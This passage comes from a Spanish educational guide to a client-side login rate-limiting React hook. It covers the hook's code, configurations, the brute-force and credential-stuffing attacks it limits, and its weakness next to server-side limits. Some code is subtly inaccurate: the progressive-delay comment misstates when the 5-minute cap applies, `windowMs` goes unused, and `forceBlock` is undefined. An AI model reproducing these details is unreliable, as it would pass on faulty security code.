        const stored = localStorage.getItem(`ratelimit_${key}`)
        if (stored) {
            const data = JSON.parse(stored)
            if (data.blockedUntil > Date.now()) {
                setState(data)  // Aún bloqueado
            } else {
                localStorage.removeItem(`ratelimit_${key}`)  // Expiró
            }
        }
    }, [key])

    // Verificar si está bloqueado
    const isBlocked = state.blockedUntil !== null && state.blockedUntil > Date.now()

    // Registrar intento fallido
    const recordAttempt = () => {
        const newAttempts = state.attempts + 1

        if (newAttempts >= config.maxAttempts) {
            const blockUntil = Date.now() + config.blockDurationMs
            const newState = { attempts: newAttempts, blockedUntil: blockUntil }
            setState(newState)
            localStorage.setItem(`ratelimit_${key}`, JSON.stringify(newState))
        } else {
            setState(prev => ({ ...prev, attempts: newAttempts }))
        }
    }

    // Resetear (cuando login es exitoso)
    const reset = () => {
        setState({ attempts: 0, blockedUntil: null })
        localStorage.removeItem(`ratelimit_${key}`)
    }

    const remainingTime = state.blockedUntil
        ? Math.ceil((state.blockedUntil - Date.now()) / 1000)
        : 0

    return { isBlocked, recordAttempt, reset, remainingTime, attempts: state.attempts }
}
```

### Uso en LoginForm

```typescript
const LoginForm = () => {
    const rateLimit = useRateLimit('login', {
        maxAttempts: 5,
        windowMs: 60000,        // 1 minuto
        blockDurationMs: 300000 // 5 minutos
    })

    const handleSubmit = async (e) => {
        e.preventDefault()

        // 1. Verificar si está bloqueado
        if (rateLimit.isBlocked) {
            setErrors({
                email: `Demasiados intentos. Espera ${rateLimit.remainingTime}s`
            })
            return
        }

        // 2. Validar formulario
        const valid = validateForm()
        if (!valid) return

        // 3. Intentar login
        try {
            await loginMutation.mutateAsync(formData)
            rateLimit.reset()  // ✅ Exitoso: resetear contador
        } catch (error) {
            rateLimit.recordAttempt()  // ❌ Fallido: incrementar
            setErrors({ email: 'Credenciales incorrectas' })
        }
    }

    return (
        <form onSubmit={handleSubmit}>
            {rateLimit.isBlocked && (
                <div className="text-red-600 text-sm mt-2">
                    Demasiados intentos. Intenta en {rateLimit.remainingTime} segundos.
                </div>
            )}

            <input
                type="email"
                disabled={rateLimit.isBlocked}
            />

            <button
                type="submit"
                disabled={rateLimit.isBlocked || loginMutation.isPending}
            >
                {rateLimit.isBlocked
                    ? `Bloqueado (${rateLimit.remainingTime}s)`
                    : 'Iniciar Sesión'}
            </button>
        </form>
    )
}
```

### Persistencia en localStorage

```javascript
// Después del 5to intento fallido:
localStorage.setItem('ratelimit_login', JSON.stringify({
    attempts: 5,
    blockedUntil: 1696875432000  // Timestamp
}))

// Si el usuario:
// - Cierra el navegador
// - Abre otra pestaña
// - Recarga la página
// ✅ Sigue bloqueado porque lee el localStorage
```

### Tipos de Ataques que Previene

#### 1. Fuerza Bruta
```
Atacante intenta adivinar contraseña:
- password123 ❌
- 123456 ❌
- qwerty ❌
- admin ❌
- password ❌
→ BLOQUEADO por 5 minutos
```

#### 2. Credential Stuffing
```
Atacante prueba credenciales robadas de otra app:
- user@email.com:leaked_pass1 ❌
- user@email.com:leaked_pass2 ❌
- user@email.com:leaked_pass3 ❌
→ BLOQUEADO
```

#### 3. Account Enumeration
```
Atacante intenta descubrir emails válidos:
- admin@empresa.com:any_pass ❌
- ceo@empresa.com:any_pass ❌
→ BLOQUEADO
→ No puede hacer millones de intentos para encontrar emails
```

### Configuraciones Típicas por Caso de Uso

```typescript
// Login - Estricto (seguridad crítica)
useRateLimit('login', {
    maxAttempts: 5,
    windowMs: 60000,       // 1 minuto
    blockDurationMs: 300000  // 5 minutos
})

// API general - Menos estricto
useRateLimit('api-calls', {
    maxAttempts: 20,
    windowMs: 60000,       // 1 minuto
    blockDurationMs: 60000   // 1 minuto
})

// Signup - Muy estricto (prevenir spam)
useRateLimit('signup', {
    maxAttempts: 3,
    windowMs: 3600000,     // 1 hora
    blockDurationMs: 3600000  // 1 hora
})

// Password reset - Estricto
useRateLimit('password-reset', {
    maxAttempts: 3,
    windowMs: 900000,      // 15 minutos
    blockDurationMs: 3600000 // 1 hora
})
```

### Limitaciones: Cliente vs Servidor

| Aspecto | Cliente (useRateLimit) | Servidor (Backend) |
|---------|------------------------|-------------------|
| **Seguridad** | ⚠️ Puede ser bypasseado | ✅ No puede bypassearse |
| **Implementación** | ✅ Ya está en el proyecto | ⚠️ Requiere backend |
| **UX** | ✅ Feedback inmediato | ❌ Requiere request |
| **Persistencia** | ⚠️ Solo en ese navegador | ✅ Global por IP/cuenta |
| **Bypass** | Borrar localStorage | Cambiar IP (VPN) |
| **Propósito** | Mejora UX | Seguridad real |

**⚠️ IMPORTANTE:**
- Rate limiting del cliente es **complementario**, NO reemplaza el del servidor
- El backend DEBE tener su propio rate limiting
- Este hook mejora la UX y reduce carga al servidor, pero no es suficiente para seguridad

### Ventajas del Rate Limiting del Cliente

1. **Mejora UX:**
   - Feedback inmediato al usuario
   - Contador regresivo visible
   - No necesita hacer request al servidor

2. **Reduce Carga al Servidor:**
   - Evita requests innecesarios
   - Menor tráfico de red
   - Menos procesamiento en backend

3. **Educación al Usuario:**
   - Muestra por qué está bloqueado
   - Tiempo restante claro
   - Incentiva a usar contraseña correcta

### Mejoras Futuras

```typescript
// Integración con backend rate limit
const handleSubmit = async () => {
    try {
        await login(email, password)
        rateLimit.reset()
    } catch (error) {
        if (error.response?.status === 429) {  // Too Many Requests
            // Backend dice que estás bloqueado
            const retryAfter = error.response.headers['retry-after']
            rateLimit.forceBlock(retryAfter * 1000)
        } else {
            rateLimit.recordAttempt()
        }
    }
}

// Progressive delay (incremento exponencial)
const getBlockDuration = (attempts: number) => {
    return Math.min(300000, Math.pow(2, attempts) * 1000)
    // Intento 1: 2s
    // Intento 2: 4s
    // Intento 3: 8s
    // Intento 4: 16s
    // Intento 5: 32s
    // Intento 6+: 5min (cap)
}
```

---

**Última actualización:** 2025-10-09
**Autor:** Guía educativa del proyecto FE-EventsR
